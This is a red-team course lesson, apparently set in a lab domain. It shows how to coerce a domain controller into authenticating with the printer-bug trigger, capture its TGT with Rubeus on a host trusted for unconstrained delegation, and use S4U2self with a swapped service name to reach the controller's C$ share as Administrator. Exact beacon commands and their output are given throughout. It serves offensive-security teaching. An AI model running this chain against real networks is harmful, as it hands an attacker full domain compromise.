
In the previous lab on [unconstrained delegation](https://www.zeropointsecurity.co.uk/path-player?courseid=red-team-ops&unit=6731fd18dc6d251272081c5f), there was an automated task that had the user _dyork_ interact with the CIFS service on _lon-ws-1_ (e.g. `dir \\lon-ws-1\c$`).  Because this computer was configured for unconstrained delegation, it allowed us to capture their TGT from memory and impersonate them to access the domain controller (since dyork happened to be a domain admin).

In the real world, we're obviously not guaranteed to have a user, let alone a DA, interact with the computer whilst we're monitoring for tickets.  Although there are techniques to harvest them by [seeding](https://www.mdsec.co.uk/2021/02/farming-for-red-teams-harvesting-netntlm/) files such as `.lnk`, `.url`, `.library-ms`, and `.searchConnector-ms`, they still rely on user-interaction.  The objective of this lesson is to go after a computer (such as domain controller) directly.

There are multiple 'remote authentication triggers' that can be used to force a computer to authenticate to another computer.  Two popular techniques include Lee Christensen's 'SpoolSample', which uses the Print System Remote Protocol [MS-RPRN]; and Topotam's 'PetitPotam', which uses the Encrypting File System Remote Protocol [MS-EFSRPC].

We could therefore monitor for tickets on lon-ws-1:

```powershell
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe monitor /interval:5 /nowrap
```

Then use a tool such as [SharpSystemTriggers](https://github.com/cube0x0/SharpSystemTriggers) to force _lon-dc-1_ to authenticate to _lon-ws-1_.

```powershell
beacon> execute-assembly C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\SharpSpoolTrigger.exe lon-dc-1 lon-ws-1

NdrClientCall2x64
[-]RpcRemoteFindFirstPrinterChangeNotificationEx status: 6
```

> You may need to run it a few times.

> The remote authentication trigger should be run as a standard domain user in a medium-integrity context.

Rubeus will then capture the TGT of the targeted computer account.

```powershell
[*] 21/02/2025 11:54:39 UTC - Found new TGT:

  User                  :  LON-DC-1$@CONTOSO.COM
  StartTime             :  21/02/2025 10:39:21
  EndTime               :  21/02/2025 20:38:58
  RenewTill             :  28/02/2025 10:38:58
  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
  Base64EncodedTicket   :

    doIFt[...snip...]5DT00=
```

However, if you inject this ticket into a logon session and attempt to access the computer using a service like CIFS, you'll see that it will fail with an 'access denied' error.

```powershell
beacon> run klist

Cached Tickets: (1)

#0>	Client: LON-DC-1$ @ CONTOSO.COM
	Server: krbtgt/CONTOSO.COM @ CONTOSO.COM
	KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
	Ticket Flags 0x60a10000 -> forwardable forwarded renewable pre_authent name_canonicalize 
	Start Time: 2/21/2025 10:39:21 (local)
	End Time:   2/21/2025 20:38:58 (local)
	Renew Time: 2/28/2025 10:38:58 (local)
	Session Key Type: AES-256-CTS-HMAC-SHA1-96
	Cache Flags: 0x1 -> PRIMARY 
	Kdc Called: 

beacon> ls \\lon-dc-1\c$
[-] could not open \\lon-dc-1\c$\*: 5 - ERROR_ACCESS_DENIED
```

This is because computer accounts do not get local admin access to themselves remotely.  The workaround to compromise any computer once you have its TGT is to use the S4U2self protocol to obtain a usable service ticket for a different (impersonated) user.  I believe this technique was first published by [Elad Shamir](https://eladshamir.com/2019/01/28/Wagging-the-Dog.html) and merged into Rubeus by [Charlie Clark](https://exploit.ph/revisiting-delegate-2-thyself.html).

Charlie added a new `/self` parameter to Rubeus' `s4u` command.

```powershell
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:Administrator /self /altservice:cifs/lon-dc-1 /ticket:doIFt[...snip...]5DT00= /nowrap
```

Where:

- `/impersonateuser` is the user we want to impersonate.
    
- `/self` tells Rubeus not to submit an S4U2proxy request.
    
- `/altservice` is the SPN we want substituted into the service ticket.
    
- `/ticket` is the computer's TGT.

```powershell
[*] Action: S4U

[*] Building S4U2self request for: 'LON-DC-1$@CONTOSO.COM'
[*] Using domain controller: lon-dc-1.contoso.com (10.10.120.1)
[*] Sending S4U2self request to 10.10.120.1:88
[+] S4U2self success!
[*] Substituting alternative service name 'cifs/lon-dc-1'
[*] Got a TGS for 'Administrator' to 'cifs@CONTOSO.COM'
[*] base64(ticket.kirbi):

      doIF/[...snip...]kYy0x
```

Rubeus performs an S4U2self request exactly as we saw with [constrained delegation](https://www.zeropointsecurity.co.uk/path-player?courseid=red-team-ops&unit=6731fd211c053b7aa602ab3b) when 'Kerberos only' is in use, i.e. for the target user where the service is the computer's own SamAccountName (_Administrator@LON-DC-1$_).  This returns a valid service ticket that would normally be used in an S4U2proxy request.  However, we can't do that since there is no constrained delegation here.  Instead, Rubeus simply swaps out the service name for the service specified in the `/altservice` parameter, which in this case becomes _Administrator@cifs/lon-dc-1_.  Again, this works because the CIFS service runs under the context of the computer account (i.e. SYSTEM), so the encrypted part of the ticket can still be decrypted.

```powershell
beacon> run klist

Cached Tickets: (1)

#0>	Client: Administrator @ CONTOSO.COM
	Server: cifs/lon-dc-1 @ CONTOSO.COM
	KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
	Ticket Flags 0x60a50000 -> forwardable forwarded renewable pre_authent ok_as_delegate name_canonicalize 
	Start Time: 2/21/2025 12:42:53 (local)
	End Time:   2/21/2025 20:38:58 (local)
	Renew Time: 2/28/2025 10:38:58 (local)
	Session Key Type: AES-256-CTS-HMAC-SHA1-96
	Cache Flags: 0 
	Kdc Called: 

beacon> ls \\lon-dc-1\c$

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     01/24/2025 13:33:39   $Recycle.Bin
          dir     01/23/2025 13:57:51   $WinREAgent
          dir     01/23/2025 13:47:37   Documents and Settings
          dir     05/08/2021 08:20:24   PerfLogs
          dir     01/23/2025 15:46:17   Program Files
          dir     01/23/2025 15:46:18   Program Files (x86)
          dir     02/21/2025 11:06:13   ProgramData
          dir     01/23/2025 13:47:43   Recovery
          dir     01/29/2025 10:42:20   System Volume Information
          dir     01/24/2025 13:33:21   Users
          dir     01/24/2025 13:49:56   Windows
 12kb     fil     02/21/2025 02:38:14   DumpStack.log.tmp
 1gb      fil     02/21/2025 02:38:14   pagefile.sys
```